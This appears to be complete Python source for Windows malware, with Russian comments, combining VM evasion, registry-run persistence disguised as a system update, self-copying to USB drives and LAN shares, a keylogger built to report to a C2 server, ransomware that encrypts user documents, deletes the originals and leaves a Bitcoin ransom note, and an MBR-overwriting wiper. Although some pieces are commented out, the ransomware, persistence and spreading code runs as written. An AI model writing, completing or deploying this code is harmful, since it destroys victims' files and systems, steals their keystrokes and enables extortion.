import os
import sys
import socket
import shutil
import threading
import time
import winreg as reg
import subprocess

from cryptography.fernet import Fernet
from pynput.keyboard import Listener

# --- КОНФИГУРАЦИЯ ---
# IP-адрес и порт твоего сервера для получения логов
C2_ADDRESS = "http://YOUR_SERVER_IP:8000/log" 
# Расширения файлов для шифрования
TARGET_EXTENSIONS = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.mp4', '.mp3', '.zip', '.rar', '.txt', '.sql', '.db']
# Имя файла для кейлоггера
LOG_FILE = "keylog.txt"
# Имя исполняемого файла после компиляции
EXE_NAME = "SystemUpdate.exe"
# Путь для закрепления в системе
PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), EXE_NAME)

class Virus:
    def __init__(self):
        self.key = None
        self.cipher_suite = None
        self.keylog_data = []

    def is_vm(self):
        """Простая проверка на запуск в виртуальной машине."""
        vm_indicators = ["virtualbox", "vmware", "qemu"]
        try:
            # Проверка по производителю системы
            system_info = subprocess.check_output("wmic computersystem get manufacturer", shell=True, stderr=subprocess.DEVNULL).decode().lower()
            for vm in vm_indicators:
                if vm in system_info:
                    return True
            # Проверка по BIOS
            bios_info = subprocess.check_output("wmic bios get serialnumber", shell=True, stderr=subprocess.DEVNULL).decode().lower()
            if "virtual" in bios_info:
                return True
        except Exception:
            pass
        return False

    def generate_key(self):
        """Генерирует ключ шифрования AES."""
        self.key = Fernet.generate_key()
        self.cipher_suite = Fernet(self.key)
        # В реальной атаке ключ отправляется на C2 сервер и удаляется с машины жертвы
        # print(f"Encryption key: {self.key.decode()}")

    def encrypt_file(self, file_path):
        """Шифрует отдельный файл."""
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
            encrypted_data = self.cipher_suite.encrypt(file_data)
            with open(file_path + '.locked', 'wb') as f:
                f.write(encrypted_data)
            os.remove(file_path)
        except Exception:
            pass

    def ransomware_payload(self):
        """Находит и шифрует файлы в системных папках пользователя."""
        target_dirs = [
            os.path.expanduser('~\\Documents'),
            os.path.expanduser('~\\Pictures'),
            os.path.expanduser('~\\Desktop'),
            os.path.expanduser('~\\Downloads'),
            os.path.expanduser('~\\Music'),
            os.path.expanduser('~\\Videos')
        ]
        for root_dir in target_dirs:
            for root, _, files in os.walk(root_dir):
                for file in files:
                    if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                        file_path = os.path.join(root, file)
                        self.encrypt_file(file_path)
        self.create_ransom_note()

    def create_ransom_note(self):
        """Создает записку с требованием выкупа."""
        note_path = os.path.join(os.path.expanduser('~\\Desktop'), 'README_FOR_DECRYPT.txt')
        with open(note_path, 'w') as f:
            f.write("Your files have been encrypted.\n")
            f.write("To get them back, send 0.5 BTC to this address: [BTC_ADDRESS]\n")
            f.write("Then email us at [EMAIL] with your transaction ID.\n")
            f.write("Do not try to recover your files, you will only damage them.\n")

    def add_to_startup(self):
        """Добавляет программу в автозагрузку Windows."""
        if not os.path.exists(PERSISTENCE_PATH):
            shutil.copyfile(sys.executable, PERSISTENCE_PATH)
        
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, "WindowsSystemUpdate", 0, reg.REG_SZ, PERSISTENCE_PATH)
        except Exception:
            pass

    def spread_via_usb(self):
        """Бесконечный цикл для поиска и заражения USB-носителей."""
        while True:
            try:
                drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:")]
                for drive in drives:
                    if os.path.isdir(drive) and drive != "C:\\":
                        target_path = os.path.join(drive, EXE_NAME)
                        if not os.path.exists(target_path):
                            shutil.copyfile(sys.executable, target_path)
            except Exception:
                pass
            time.sleep(10)

    def spread_via_network(self):
        """Сканирует локальную сеть и пытается скопировать себя."""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        ip_prefix = ".".join(local_ip.split('.')[:-1]) + "."

        for i in range(1, 255):
            target_ip = ip_prefix + str(i)
            if target_ip == local_ip:
                continue
            
            # Примитивная попытка скопировать себя в общедоступные папки
            # В реальном черве используются эксплойты (EternalBlue) или брутфорс SMB/SSH
            for share in ["C$\\Users\\Public\\Downloads", "Users\\Public\\Downloads"]:
                target_path = f"\\\\{target_ip}\\{share}\\{EXE_NAME}"
                try:
                    # Эта команда требует прав, но демонстрирует принцип
                    shutil.copyfile(sys.executable, target_path)
                except Exception:
                    pass
            time.sleep(0.1)

    def on_key_press(self, key):
        """Обработчик нажатия клавиш."""
        self.keylog_data.append(str(key))
        if len(self.keylog_data) > 50:
            self.send_log()

    def send_log(self):
        """Отправляет накопленные нажатия клавиш на C2 сервер."""
        try:
            log = "".join(self.keylog_data)
            # requests.post(C2_ADDRESS, data={'log': log}) # Закомментировано для безопасности
            print(log) # Для демонстрации выводим в консоль
            self.keylog_data = []
        except Exception:
            pass

    def start_keylogger(self):
        """Запускает кейлоггер в отдельном потоке."""
        with Listener(on_press=self.on_key_press) as listener:
            listener.join()

    def wiper_payload(self):
        """Уничтожает систему, удаляя ключевые файлы или перезаписывая MBR."""
        # ОСТОРОЖНО: ЭТИ КОМАНДЫ МОГУТ ПОВРЕДИТЬ ВАШУ СИСТЕМУ
        # Вариант 1: Удаление системных файлов (требует прав администратора)
        critical_files = [
            # "C:\\Windows\\System32\\ntoskrnl.exe", # ядро ОС
            # "C:\\Windows\\System32\\hal.dll", # HAL
            # "C:\\boot.ini" # старый загрузчик
        ]
        for f in critical_files:
            try:
                os.remove(f)
            except Exception:
                pass
        
        # Вариант 2: Перезапись MBR (Master Boot Record) - делает систему незагружаемой
        # Эта команда запишет 512 нулевых байтов в начало первого диска
        try:
            with open('\\\\.\\PhysicalDrive0', 'wb') as f:
                f.write(b'\0' * 512)
        except PermissionError:
            # Требуются права администратора
            pass
        except Exception:
            pass

        # Принудительная перезагрузка для применения "эффекта"
        subprocess.call(["shutdown", "/r", "/t", "0"], shell=True)


    def execute(self):
        """Основной метод, запускающий все вредоносные действия."""
        # 0. Проверка на VM
        if self.is_vm():
            sys.exit(0)
            
        # 1. Закрепление в системе
        self.add_to_startup()
        
        # 2. Запуск фоновых задач (распространение, кейлоггер)
        threading.Thread(target=self.spread_via_usb, daemon=True).start()
        threading.Thread(target=self.spread_via_network, daemon=True).start()
        threading.Thread(target=self.start_keylogger, daemon=True).start()
        
        # 3. Основная вредоносная нагрузка
        self.generate_key()
        self.ransomware_payload()
        
        # 4. Финальный аккорд - уничтожение системы
        # self.wiper_payload() # Раскомментировать для активации вайпера

if __name__ == "__main__":
    virus = Virus()
    virus.execute()

